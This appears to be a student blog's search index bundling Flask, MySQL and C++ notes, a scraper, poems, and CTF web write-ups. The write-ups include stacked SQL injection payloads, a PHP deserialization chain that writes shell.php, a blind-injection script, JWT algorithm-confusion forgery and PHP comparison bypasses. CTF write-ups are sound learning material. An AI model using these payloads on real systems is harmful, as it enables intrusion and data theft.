<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[flask框架学习]]></title>
    <url>%2F2019%2F07%2F09%2Fflask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[flask框架学习搭建虚拟环境安装virtualenv1pip3 install virtualenv 开辟虚拟空间1virtualenv flask-env 激活虚拟环境123linux/mac: source flask-env/bin/activewindows: cd flask-env/Scripts 执行active退出虚拟环境: deactive 虚拟环境安装flask1pip3 install flask 创建flask项目我用pycharm创建一个flask项目，interpreter要选择自己的虚拟环境里的python.exe。然后就成功生成一个简单的模板。123456789101112131415161718192021222324from flask import Flask #从flask这个框架中导入Flask这个类# 初始化一个Flask对象# Flask()# 需要传递一个参数__name__# 1.方便flask框架去寻找资源# 2.方便flask插件比如Flask-Sqlalchemy出现错误的时候，找到问题所在的位置app = Flask(__name__)# @app.route 是一个装饰器# @开头,并且在函数的上面，说明是装饰器# 这个装饰器的作用，是做一个url与视图函数的映射# 127.0.0.1:5000/ -&gt;去请求hello_world这个函数，然后将请求结果返回给浏览器@app.route('/')def hello_world(): return "Hello chenxiyuan"# 若果当前文件是作为入口程序运行，那么就执行app.run()if __name__ == '__main__': # app,run() # 启动一个应用服务器，来接受用户的请求 # while True: # listen() app.run() debugdebug模式,在pycharm里启动配置中要勾选FLASK_DEBUG1app.run(debug=True) 使用配置文件新建config.py1DEBUG = True 主程序1234567891011from flask import Flaskimport configapp = Flask(__name__)app.config.from_object(config)@app.route('/')def hello_world(): return "Hello world"if __name__ == '__main__': app.run() url传参数123@app.route('/a/&lt;id&gt;') #参数放在&lt;&gt;中def a(id): return u"您请求的参数是：%s" % id url反转url_for函数，视图函数的名称作为参数，返回视图函数的url。1234567891011from flask import Flask,url_forapp = Flask(__name__)@app.route('/')def index(): return url_for('a',id=1)@app.route('/list/&lt;id&gt;')def a(id): return u"您请求的参数是：%s" % idif __name__ == '__main__': app.run() 页面跳转和重定向redirect() Jinja2模板模板渲染和参数 模板放在templates文件夹下 从flask中导入render_template 模板传参:创建一个字典，在render_template函数中使用**传入 html里用123456789101112131415165. 参数也可以是对象和字典```pythonfrom flask import Flask,render_templateapp = Flask(__name__)@app.route(&apos;/&apos;)def index(): class Person: name = &quot;廉天龙&quot; age = 19 p = Person() context =&#123;&apos;username&apos;:&apos;chenxiyuan&apos;,&apos;gender&apos;:&apos;男&apos;,&apos;age&apos;:&apos;19&apos;,&apos;person&apos;:p&#125; return render_template(&apos;index.html&apos;,**context)if __name__ == &apos;__main__&apos;: app.run() 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html lang="cn"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;用户名:&#123;&#123; username &#125;&#125;&lt;/p&gt;&lt;p&gt;性别:&#123;&#123; gender &#125;&#125;&lt;/p&gt;&lt;p&gt;年龄:&#123;&#123; age &#125;&#125;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;名字:&#123;&#123; person['name'] &#125;&#125;&lt;/p&gt;&lt;p&gt;年龄:&#123;&#123; person.age &#125;&#125;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; if语句12345使用 &#123;% if 条件 %&#125; ... &#123;% else %&#125; ... &#123;% endif %&#125; for语句123&#123;% for 条件 %&#125; ...&#123;% endfor %&#125; 过滤器|符号后接过滤器，本质是函数。 default过滤器 1&#123;&#123;arg|default(&apos;...&apos;)&#125;&#125;#变量不存在取默认 length过滤器返回长度 继承和block父模板要写，子模板要写自己的内容一定要放在block里 1234&#123;% extends &apos;base.html&apos; %&#125;&#123;% block name %&#125; ...&#123;% endblock %&#125; 加载静态文件url_for(‘static’,filename=’路径’) 加载css 1&lt;lin rel=&quot;stylesheet&quot; href=&quot;&#123;&#123;url_for(&apos;static&apos;,filename=&apos;css/index.css&apos;)&#125;&#125;&quot;&gt; 加载js 1&lt;script src=&quot;&#123;&#123;url_for(&apos;static&apos;,filename=&apos;js/index.js&apos;)&#125;&#125;&quot;&gt;&lt;/script&gt; SQLAlchemy数据库ORM与flask_sqlalchemy ORM: Object Relationship Mapping (模型关系映射) flask_sqlalchemy是一套ORM框架 pip install flask_sqlalchemySQLAlchemy使用 设置配置信息 12345678910#新建config.py#配置格式:dialect+driver://username:password@host:port/databaseDIALECT = &apos;mysql&apos;DRIVER = &apos;pymysql&apos;USERNAME = &apos;root&apos;PASSWORD =&apos;&apos;HOST = &apos;127.0.0.1&apos;PORT = &apos;3306&apos;DATABASE = &apos;test&apos;SQLALCHEMY_DATABASE_URI=&quot;&#123;&#125;+&#123;&#125;://&#123;&#125;:&#123;&#125;@&#123;&#125;:&#123;&#125;/&#123;&#125;?charset=utf8&quot;.format(DIALECT,DRIVER,USERNAME,PASSWORD,HOST,PORT,DATABASE) 调用 123456789from flask import Flaskfrom flask_sqlalchemy import SQLAlchemyimport configapp = Flask(__name__)app.config.from_object(config)db = SQLAlchemy(app)db.create_all()# 如果没有报错说明配置正确 SQLAlchemy模型与表映射 模型需要继承自db.Model,然后需要映射到表中的属性必须写成db.Column的数据类型 例子1234567class Article(db.Model): __tablename__ = 'article' id = db.Column(db.Integer,primary_key=True,autoincrement=True) title =db.Column(db.String(100),nullable=False) content =db.Column(db.Text,nullable=False)db.create_all()#这时候就可以在数据库中看到已经生成了一张表]]></content>
      <categories>
        <category>python学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则爬妹子图]]></title>
    <url>%2F2019%2F07%2F09%2F%E6%AD%A3%E5%88%99%E7%88%AC%E5%A6%B9%E5%AD%90%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[直接上代码吧，之前看了多线程，在这种io密集型情况下使用多线程效率会大大提高，但我写的时候就报错了，再研究一段时间再添加多线程吧。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import requestsimport osimport redirs="D:/妹子图"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4094.1 Safari/537.36'&#125;def mkdir(): #创建文件夹 if not os.path.exists(dirs): os.mkdir('D:/妹子图') os.chdir('D:/妹子图') print("D:/妹子图") return True else: print("妹子图文件夹已存在") return Falsedef get_max_page():#获取到最大的页面数 url="https://www.mzitu.com/zipai/" r = requests.get(url,headers=headers) result=re.findall("&lt;span aria-current='page' class='page-numbers current'&gt;(.*?)&lt;/span&gt;",r.text,re.S) return result[0]def find_onepage_imgs(url):#匹配到一个页面里所有的图片地址以及上传时间 r=requests.get(url,headers=headers) result=re.findall('&lt;div class="comment-meta commentmetadata"&gt;&lt;a href=".*?"&gt;(.*?)&lt;/a&gt;.*?&lt;/div&gt;.*?&lt;p&gt;&lt;img class="lazy".*?data-original="(.*?)".*?&lt;/p&gt;',r.text,re.S) return resultdef download_onepage(onepage_list): for j in onepage_list: global a path0=j[0].split() path=path0[0][0:4]+path[0][5:7]+path[0][8:10]+path[1]+path[2][0:2]+path[2][3:5]#把上传时间切片后作为文件名 img=requests.get(j[1]) if os.path.exists(path+".jpg"):#因为上传时间可能相同，所以判断一下，如果相同就a+1 a=a+1 path=path+str(a) with open(path+".jpg", 'wb+') as f: print("下载第"+str(i)+"页提交于"+path0+"的图片") f.write(img.content) else: a=1 with open(path+".jpg", 'wb+') as f: print("下载第"+str(i)+"页提交于"+path0+"的图片") f.write(img.content)a=1if __name__== '__main__': mkdir() max_page=get_max_page() for i in range(int(max_page),1,-1): onepage_list=find_onepage_imgs("http://www.mzitu.com/zipai/comment-page-"+ str(i)+"/#comments" ) download_onepage(onepage_list)]]></content>
      <categories>
        <category>python学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python访问mysql]]></title>
    <url>%2F2019%2F07%2F08%2Fpython%E8%AE%BF%E9%97%AEmysql%2F</url>
    <content type="text"><![CDATA[驱动这里我使用两种驱动，一个是mysql-connector另一个是PyMySQL，两个的语法都差不多,就说说pymysql吧。 安装pip install mysql-connector pip3 install PyMySQL 使用数据库连接12345678910111213import pymysqlconn = pymysql.connect("localhost","root","password","database") #打开数据库连接cursor=conn.cursor() #使用 cursor() 方法创建一个游标对象 cursorcursor.execute("SELECT VERSION()") #使用execute()方法执行SQL查询data = cursor.fetchone() #使用fetchone()方法获取单条数据print(data)conn.close() #关闭数据库连接 数据表更新当数据表内容有更新时，必须用commit()方法12345678910111213import pymysqlconn = pymysql.connect("localhost","root","password","database")cursor=conn.cursor()sql = "INSERT INTO table_name (field1,field2) VALUES (value1,value2)"cursor.execute(sql)conn.commit()coon.close()]]></content>
      <categories>
        <category>python学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019强网杯web Writeup]]></title>
    <url>%2F2019%2F05%2F27%2F2019%E5%BC%BA%E7%BD%91%E6%9D%AFwebwp%2F</url>
    <content type="text"><![CDATA[0x01随便注12345678CREATE DATABASE supersqli;USE supersqli;CREATE TABLE `1919810931114514` (`flag` VARCHAR(100) NOT NULL);INSERT INTO `1919810931114514` (`flag`) VALUES('flag&#123;...............&#125;');CREATE TABLE `words` (`id` INT NOT NULL,`data` VARCHAR(100) NOT NULL);INSERT INTO `words` (`id`,`data`) VALUES(1,'Only red tea');INSERT INTO `words` (`id`,`data`) VALUES(2,'I have a big planet');INSERT INTO `words` (`id`,`data`) VALUES(114514,'come on baby!'); 这道题从郁师傅那里学到了骚套路。首先发现了waf，过滤的其实还算少。这题可以用堆叠注入查表和字段，整个结构就清晰了。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970';show tables;/*array(2) &#123;[0]=&gt;array(1) &#123;["Tables_in_supersqli"]=&gt;string(16) "1919810931114514"&#125;[1]=&gt;array(1) &#123;["Tables_in_supersqli"]=&gt;string(5) "words"&#125;&#125;*/';show columns from words;/*array(2) &#123;[0]=&gt;array(6) &#123;["Field"]=&gt;string(2) "id"["Type"]=&gt;string(7) "int(11)"["Null"]=&gt;string(3) "YES"["Key"]=&gt;string(0) ""["Default"]=&gt;NULL["Extra"]=&gt;string(0) ""&#125;[1]=&gt;array(6) &#123;["Field"]=&gt;string(4) "data"["Type"]=&gt;string(4) "text"["Null"]=&gt;string(3) "YES"["Key"]=&gt;string(0) ""["Default"]=&gt;NULL["Extra"]=&gt;string(0) ""&#125;&#125;*/';show columns from `1919810931114514`;/*array(1) &#123;[0]=&gt;array(6) &#123;["Field"]=&gt;string(4) "flag"["Type"]=&gt;string(4) "text"["Null"]=&gt;string(3) "YES"["Key"]=&gt;string(0) ""["Default"]=&gt;NULL["Extra"]=&gt;string(0) ""&#125;&#125;*/ sql语句也很清楚了，select被过滤了，但查询语句查的是words表，而flag在另一个表中，如何查询呢？1SELECT id,`data` FROM words WHERE id='1' ; 注意到waf黑名单其实过滤的很少的，比如alter和rename没被过滤就可以加以利用。我们可以把words表名改掉，再把flag所在表名改成words，再利用alter添加id字段，即可成功查询。1payload:';rename table words to wordss;rename table `1919810931114514` to words;alter table words add id int default 1# 另一种方法是利用自定义变量绕过，学到了学到了。1-1';use supersqli;set @sqli=concat('se','lect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sqli;EXECUTE stmt1; 0x02 upload题目环境 https://github.com/CTFTraining/qwb_2019_upload这道题从高明的黑客那里得到提示，访问www.tar.gz，果然源码泄露。拿到源码很无奈，因为upload那里把文件名MD5以后加上png后缀，我就没思路了。赛后看其他大佬的复现，终于懂了。这道题是利用反序列化，执行我们需要的代码。1234public function login_check()&#123; $profile=cookie('user'); if(!empty($profile))&#123; $this-&gt;profile=unserialize(base64_decode($profile)); profile中存在魔术方法get和call，当访问不存在的变量或私有变量时调用get(),在对象中调用一个不可访问方法或私有方法时调用call()。123456789101112public function __get($name) &#123; return $this-&gt;except[$name]; &#125; public function __call($name, $arguments) &#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125; &#125; 继续阅读源码，在Register中发现析构函数调用了checker的index()函数，而Profile中不存在，所以我们就可以反序列化传入一个Register对象，Register的checker成员变量是Profile对象，这样就能触发call和get方法了。再调用Profile中的upload_img()，通过控制成员变量，可以控制执行copy函数就能成功生成图马。123456public function __destruct() &#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); &#125; &#125; 首先先上传一个图马，获取到图片地址再利用payload序列化并base64编码再传入cookie访问，成功upload图马。payload如下123456789101112131415161718192021222324&lt;?phpnamespace app\web\controller;class Profile&#123; public $checker; public $filename_tmp="../public/upload/.../...";//图片路径 public $filename="../public/upload/.../shell.php"; public $upload_menu; public $ext=1; public $img; public $except=array('index'=&gt;'upload_img');&#125;class Register&#123; public $checker; public $registed=0;&#125;$a=new Register();$a-&gt;checker=new Profile();$a-&gt;checker-&gt;checker = 0;echo base64_encode(serialize($a));]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iscc2019 web wp]]></title>
    <url>%2F2019%2F05%2F22%2Fiscc2019-web-wp%2F</url>
    <content type="text"><![CDATA[web1这个涨姿势，chr()函数是模256，在原数加256即可绕过，intval可以用科学计数法绕过，payload如下1password=2e5&amp;value[]=375&amp;value[]=307&amp;value[]=364&amp;value[]=355&amp;value[]=304&amp;value[]=365&amp;value[]=357&amp;value[]=351&amp;value[]=340&amp;value[]=367&amp;value[]=351&amp;value[]=329&amp;value[]=339&amp;value[]=323&amp;value[]=323&amp;value[]=306&amp;value[]=304&amp;value[]=305&amp;value[]=313 web2这题拿到了一血，因为我一发入魂，直接猜到996，果然ctf需要一点脑洞（联系到之前的996事件）。可以用burp，删除cookie和user_code就能暴力破解过验证码了。 web3这题是sql-libs原题，二次注入。 web4 parse_str()把查询字符串解析到变量中,存在变量覆盖，payload如下1action=auth&amp;key=1&amp;hashed_key=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b web5首先说我们不是Union.373组织成员，推测是改user-agent，果然，接着又让我们输入用户名和密码，post提交username和password，得到提示组织成员密码即为flag。此题为union盲注，参考下大佬的教程http://wonderkun.cc/index.html/?p=547先得到username1username=&apos; or 1 union select 1,2,3 &amp;password=&apos;1 然后改脚本就能爆出flag12345678910111213141516171819import requestsdef getPassword(): url="http://39.100.83.188:8054/" username="union_373_Tom' union distinct select 1,2,0x&#123;&#125; order by 3,'0" flag="" for _ in range(32): for i in range(48,120): headers=&#123;"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Union.373"&#125; data =&#123;"username":username.format((flag+chr(i)).encode('hex')),"password":'1'&#125; res = requests.post(url,data=data,headers=headers) res.encoding='utf-8' if "union_373_Tom" in res.text: flag= flag+chr(i-1) print flag break if __name__== '__main__': getPassword() web6第一次遇到这种jwt题，参考教程https://zhuanlan.zhihu.com/p/37305980首先看到Sources里commom.js，我的用户名是chenxiyuan123456function getpubkey()&#123; /* get the pubkey for test /pubkey/&#123;md5(username+password)&#125; */&#125; 访问拿到自己的pubkey，写脚本构造jwt1234567import jwtimport base64public="-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\nIC+LX+9V/mpyKe9R3wIDAQAB\n-----END PUBLIC KEY-----"print(jwt.encode(&#123;"name": "chenxiyuan","priv": "admin"&#125;, key=public, algorithm='HS256'))"""b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiY2hlbnhpeXVhbiIsInByaXYiOiJhZG1pbiJ9.3tR0nOjSaz701Z42jmUVRsToZBLy_S-8VoMXktVFQBk'""" 携带新的jwt访问list，得到admin信息访问text/admin:22f1e0aa7a31422ad63480aa27711277，得到flag]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[诗]]></title>
    <url>%2F2019%2F05%2F21%2F%E8%AF%97%2F</url>
    <content type="text"><![CDATA[这个学期上了李雷老师的诗词写作与鉴赏任选课，总归是有收获的。贴出来几首自己感觉还行的诗。鹳雀楼雄伟镇中州，三朝暗淡收。而今强复起，屹立更千秋。 踏青西郊院外花争艳，千万红黄聚簇开。惊诧清香何处觅，池莲衣素送风来。 赠友人风流如我辈，分袂亦欣然。草甸观星笑，茅庐试弈谈。啸歌传四海，吟咏共婵娟。会有重逢日，飞花再纵欢。 春夜闲适有感庭前闲扫晚飞樱，又见嫣红轻舞盈。身惹霞阵全不厌，抬头更看两三星。 咏于谦为立生民命，功争日月光。先生冤惨死，黯淡九州伤。 记语文老师腰柳亭如立，蹁跹步送春。飘然温细语，引我入知门。 念奴娇仰观中条，尽峰峦逼仄，连冈叠嶂。飞瀑腾冲平断壁，天际远衔横浪。漫步山间，绝巘怪柏，惊有千般样。穿石风瑟，黯然伤过往。倭寇谋略中原，欲从此入，好个修罗场。火炮纷飞砸裂谷，鲜血浸染残阳。也持剑护，杀贼三万，再把黄河唱。乘龙直上，斩碎一切虚妄。]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>诗</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[c++多态性]]></title>
    <url>%2F2019%2F05%2F13%2Fc-%E5%A4%9A%E6%80%81%E6%80%A7%2F</url>
    <content type="text"><![CDATA[南邮关于c++多态性的上机题，写的时候还是遇到了很多问题的。1定义复数类Complex，有实部、虚部两个私有成员变量，在该类中定义多个重载的构造函数、定义析构函数和输出函数print，复数的输出形如12-3i，在类中重载+、−、*、/、++（分前++和后++）。在主函数（直接用实验教材P210代码）中定义复数类的对象，实现复数的各种算术运算，通过重载实现静态多态性。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#include &lt;iostream&gt;#include &lt;string.h&gt;using namespace std;class Complex&#123; private: float real; float imag; public: Complex(float r=0,float i=0); void print(); friend Complex operator + (const Complex &amp;a,const Complex &amp;b); friend Complex operator - (const Complex &amp;a,const Complex &amp;b); friend Complex operator ++ (Complex &amp;a); Complex operator ++ (int); Complex operator * (const Complex &amp;b); Complex operator / (const Complex &amp;b);&#125;;Complex::Complex(float r,float i)&#123; real=r; imag=i;&#125;void Complex::print()&#123; cout&lt;&lt;real; if(imag!=0) &#123; if(imag&gt;0)cout&lt;&lt;"+";cout&lt;&lt;imag&lt;&lt;"i"; &#125; cout&lt;&lt;endl;&#125;Complex operator + (const Complex &amp;a,const Complex &amp;b)&#123; Complex temp; temp.real=a.real+b.real; temp.imag=a.imag+b.imag; return temp;&#125;Complex operator - (const Complex &amp;a,const Complex &amp;b)&#123; Complex temp; temp.real=a.real-b.real; temp.imag=a.imag-b.imag; return temp;&#125;Complex operator ++(Complex &amp;a)&#123; ++a.real; ++a.imag; return a;&#125;Complex Complex::operator ++ (int)&#123; Complex temp(*this); real++; imag++; return temp;&#125;Complex Complex::operator * (const Complex &amp;b)&#123; Complex temp; temp.real=this-&gt;real*b.real-this-&gt;imag*b.imag; temp.imag=this-&gt;real*b.imag+this-&gt;imag*b.real; return temp; &#125;Complex Complex::operator / (const Complex &amp;b)&#123; Complex temp; temp.real=(this-&gt;real*b.real+this-&gt;imag*b.imag)/(b.real*b.real+b.imag*b.imag); temp.imag=(this-&gt;imag*b.real-this-&gt;real*b.imag)/(b.real*b.real+b.imag*b.imag); return temp;&#125;int main()&#123; Complex A1(2.3,4.6),A2(3.6,2.8); Complex A3,A4,A5,A6; A3=A1+A2; A4=A1-A2; A5=A1*A2; A6=A1/A2; cout&lt;&lt;"A1="; A1.print(); cout&lt;&lt;endl&lt;&lt;"A2="; A2.print(); cout&lt;&lt;endl&lt;&lt;"A3=A1+A2="; A3.print(); cout&lt;&lt;endl&lt;&lt;"A4=A1-A2="; A4.print(); cout&lt;&lt;endl&lt;&lt;"A5=A1*A2="; A5.print(); cout&lt;&lt;endl&lt;&lt;"A6=A1/A2="; A6.print(); A3=++A1; cout&lt;&lt;endl&lt;&lt;"after A3=++A1"; cout&lt;&lt;"A1="; A1.print(); cout&lt;&lt;"A3="; A3.print(); A4=A2++; cout&lt;&lt;endl&lt;&lt;"after A4=A2++"; cout&lt;&lt;"A2="; A2.print(); cout&lt;&lt;"A4="; A4.print(); return 0; &#125; 2设计一个矩阵类，要求矩阵类中重载运算符加（＋）和赋值（＝），主函数定义类对象并调用重载的运算符。 提示： (1) 本题考虑可加（即加与被加矩阵的行列数必须分别相等）和可赋值（等号左值的行列数变为右值的行列数）情况，其他情况输出“ program terminated! ”(2) 要求分别输入矩阵 am 和 bm 的行列数，各矩阵元素，分别计算 cm=am+bm;am=bm; 并进行输出(3) 定义相应的构造函数和析构函数(4) 类中的成员变量应当有三个：int row,co请动态空间，存放row*col个整数(5) 程l;分别表示矩阵的行数和列数，另外还需要定义一个一级指针或二级指针用来申序最前面的文件包含请用下面代码： #include #include &lt;stdlib.h&gt;using namespace std;(6)main()已给出，请直接复制使用123456789101112131415161718192021int main()&#123; int row_a,col_a,row_b,col_b; cout&lt;&lt;"请输入am矩阵的行数和列数:"&lt;&lt;endl; cin&gt;&gt;row_a&gt;&gt;col_a; Matrix am(row_a,col_a); cout&lt;&lt;"请输入bm矩阵的行数和列数:"&lt;&lt;endl; cin&gt;&gt;row_b&gt;&gt;col_b; Matrix bm(row_b,col_b),cm; cout&lt;&lt;"am:"&lt;&lt;endl; am.disp(); cout&lt;&lt;"bm:"&lt;&lt;endl; bm.disp(); cm=am+bm; cout&lt;&lt;"cm=am+bm:"&lt;&lt;endl; cm.disp(); am=bm; cout&lt;&lt;"am=bm:"&lt;&lt;endl; am.disp(); return 0;&#125; (7)类的成员函数disp的代码已给出，请直接复制使用：12345678910void Matrix::disp()&#123; for(int i=0;i&lt;row;i++) &#123; cout&lt;&lt;'\t'; for(int j=0;j&lt;col;j++) cout&lt;&lt;*(m+i*col+j)&lt;&lt;'\t'; cout&lt;&lt;endl; &#125;&#125; 最后代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129#include &lt;iostream&gt;#include &lt;stdlib.h&gt;using namespace std;class Matrix&#123; private: int *m; int row; int col; public: Matrix(int r=0,int c=0) &#123; row=r; col=c; m= new int[row*col]; if(row!=0&amp;&amp;col!=0) &#123; cout&lt;&lt;"请输入该矩阵元素:" &lt;&lt;endl; for (int i=0;i&lt;r*c;i++) &#123; cin&gt;&gt;*(m+i); &#125; &#125; &#125; ~Matrix() &#123; delete [] m; &#125; void disp() &#123; for(int i=0;i&lt;row;i++) &#123; cout&lt;&lt;'\t'; for(int j=0;j&lt;col;j++) cout&lt;&lt;*(m+i*col+j)&lt;&lt;'\t'; cout&lt;&lt;endl; &#125; &#125; friend Matrix operator + ( const Matrix &amp;A, const Matrix &amp;B); Matrix &amp; operator = (const Matrix &amp;B) &#123; if((this-&gt;row==0)&amp;&amp;(this-&gt;col==0))//用来判断cm=am+bm这种情形 &#123; this-&gt;row=B.row; this-&gt;col=B.col; m= new int[row*col]; for(int i=0;i&lt;(B.row*B.col);i++) &#123; this-&gt;m[i]=B.m[i]; &#125; &#125; if(((this-&gt;row==B.row)&amp;&amp;(this-&gt;col==B.col)))//判断am=bm这种情形 &#123; delete [] m; for(int i=0;i&lt;(B.row*B.col);i++) &#123; this-&gt;m[i]=B.m[i]; &#125; &#125; else &#123; cout&lt;&lt;"program terminated!"&lt;&lt;endl; exit(0); &#125; &#125; &#125;;Matrix operator +(const Matrix&amp; A,const Matrix&amp; B)&#123; Matrix C; if((A.row==B.row)&amp;&amp;(A.col==B.col)) &#123; C.row=A.row; C.col=A.col; C.m=new int[(C.row*C.col)]; for(int i=0;i&lt;(A.row*A.col);i++) &#123; C.m[i]=A.m[i]+B.m[i]; &#125; &#125; else &#123; cout&lt;&lt;"program terminated!"&lt;&lt;endl; exit(0); &#125; return C;&#125;int main()&#123; int row_a,col_a,row_b,col_b; cout&lt;&lt;"请输入am矩阵的行数和列数:"&lt;&lt;endl; cin&gt;&gt;row_a&gt;&gt;col_a; Matrix am(row_a,col_a); cout&lt;&lt;"请输入bm矩阵的行数和列数:"&lt;&lt;endl; cin&gt;&gt;row_b&gt;&gt;col_b; Matrix bm(row_b,col_b),cm; cout&lt;&lt;"am:"&lt;&lt;endl; am.disp(); cout&lt;&lt;"bm:"&lt;&lt;endl; bm.disp(); cm=am+bm; cout&lt;&lt;"cm=am+bm:"&lt;&lt;endl; cm.disp(); am=bm; cout&lt;&lt;"am=bm:"&lt;&lt;endl; am.disp(); return 0;&#125;]]></content>
      <tags>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[简单的代码审计]]></title>
    <url>%2F2019%2F04%2F25%2F%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[bugku里一些简单的代码审计题extract变量覆盖http://123.206.87.240:9009/1.php12345678910111213141516&lt;?php$flag='xxx';extract($_GET);if(isset($shiyan))&#123;$content=trim(file_get_contents($flag));if($shiyan==$content)&#123;echo'flag&#123;xxx&#125;';&#125;else&#123;echo'Oh.no';&#125;&#125;?&gt; 首先extract函数用来将变量从数组中导入到当前的符号表中。这里要让$shiyan==$content,那么只要给$flag和$shiyan变量同时传入空值即可。 1payload:shiyan=&amp;flag= strcmp比较字符串http://123.206.87.240:9009/6.php12345678910 &lt;?php $flag = "flag&#123;xxxxx&#125;"; if (isset($_GET['a'])) &#123; if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 //比较两个字符串（区分大小写） die('Flag: '.$flag); else print 'No'; &#125;?&gt; 在5.3之前的php中,strcmp()在比较字符串和数组的时候直接返回0，这样通过把目标变量设置成数组就可以绕过该函数的限制. 1payload:a[]=1 urldecode二次编码绕过http://123.206.87.240:9009/10.php12345678910111213141516171819202122&lt;?phpif(eregi("hackerDJ",$_GET[id])) &#123;echo("not allowed!");exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == "hackerDJ")&#123;echo "Access granted!";echo "flag";&#125;?&gt; (PHP 4, PHP 5)eregi函数以不区分大小写的正则表达式匹配，我们只要利用两次urldecode第一次是浏览器的解码第二次是函数的解码，就可以绕过了。这里只对其中一个字符D编码两次就行了，由于D的ascii码16进制值为0x44，所以第一次urlencode是%44，第二次%2544。1payload:id=hacker%2544J md5()函数http://123.206.87.240:9009/18.php123456789101112&lt;?phperror_reporting(0);$flag = 'flag&#123;test&#125;';if (isset($_GET['username']) and isset($_GET['password'])) &#123;if ($_GET['username'] == $_GET['password'])print 'Your password can not be your username.';else if (md5($_GET['username']) === md5($_GET['password']))die('Flag: '.$flag);elseprint 'Invalid password';&#125;?&gt; 这是一道很经典的题了，两变量值不等MD5值相等，利用MD5对数组返回NULL，即可绕过。1payload:username[]=1&amp;password[]=2 数组返回NULL绕过http://123.206.87.240:9009/19.php123456789101112&lt;?php$flag = "flag";if (isset ($_GET['password'])) &#123;if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)echo 'You password must be alphanumeric';else if (strpos ($_GET['password'], '--') !== FALSE)die('Flag: ' . $flag);elseecho 'Invalid password';&#125;?&gt; 看到题目就知道要，传数组进去了，两次返回都是NULL，不等于FALSE绕过成功。还有可以正常利用ereg遇到%00就截止来绕过。1payload: password[]=1或password=a%00-- 弱类型整数大小比较绕过http://123.206.87.240:9009/22.php1234$temp = $_GET['password'];is_numeric($temp)?die("no numeric"):NULL;if($temp&gt;1336)&#123;echo $flag; is_numeric() 函数用于检测变量是否为数字或数字字符串。可以用数组绕过，也可以在数字后跟任意符号或文本绕过。1payload: password[]=1或password=1367$ sha()函数比较绕过http://123.206.87.240:9009/7.php123456789101112131415161718192021222324252627282930&lt;?php$flag = "flag";if (isset($_GET['name']) and isset($_GET['password']))&#123;var_dump($_GET['name']);echo "";var_dump($_GET['password']);var_dump(sha1($_GET['name']));var_dump(sha1($_GET['password']));if ($_GET['name'] == $_GET['password'])echo 'Your password can not be your name!';else if (sha1($_GET['name']) === sha1($_GET['password']))die('Flag: '.$flag);elseecho 'Invalid password.';&#125;elseecho 'Login first!';?&gt; 数组绕过,sha1()函数无法处理数组类型，将报错并返回NULL，if 条件成立，获得flag。1payload: name[]=1&amp;password[]=2 md5加密相等绕过http://123.206.87.240:9009/13.php123456789101112&lt;?php$md51 = md5('QNKCDZO');$a = @$_GET['a'];$md52 = @md5($a);if(isset($a))&#123;if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123;echo "flag&#123;*&#125;";&#125; else &#123;echo "false!!!";&#125;&#125;else&#123;echo "please input a";&#125;?&gt; 由于php对数据的处理问题，当它读到0exxx的时候会当做科学计数法来处理。无论0e后面是什么，0的多少次方还是0.md5(QNKCDZO)=0e830400451993494058024219903391md5(240610708)=0e4620974319065090195629887368541payload: a=240610708 十六进制与数字比较http://123.206.87.240:9009/20.php12345678910111213141516171819202122232425&lt;?phperror_reporting(0);function 